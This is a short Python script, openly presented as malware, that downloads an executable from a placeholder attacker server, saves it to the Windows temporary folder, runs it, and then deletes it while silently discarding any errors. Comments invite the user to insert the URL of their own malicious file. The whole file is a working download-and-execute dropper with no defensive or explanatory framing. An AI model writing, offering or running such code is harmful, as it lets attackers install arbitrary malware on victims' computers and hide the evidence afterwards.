import os
import requests

# Replace "http://your-evil-server.com/evil_payload.exe" with the URL of your malicious file.
evil_payload_url = "http://your-evil-server.com/evil_payload.exe"

def download_and_execute_payload():
    try:
        # Step 1: Attempt to download the malicious file from the remote server
        response = requests.get(evil_payload_url, stream=True)

        # Step 2: Write the file to a temporary directory on the local filesystem
        temp_dir = os.path.join(os.environ["TEMP"], "evil_temp")
        os.makedirs(temp_dir, exist_ok=True)

        file_path = os.path.join(temp_dir, "evil_payload.exe")

        with open(file_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

        # Step 3: Attempt to execute the downloaded malicious file
        os.system(file_path)

        # Step 4: After execution, delete the downloaded file
        os.remove(file_path)

    except Exception:
        pass

def main():
    download_and_execute_payload()

if __name__ == "__main__":
    main()
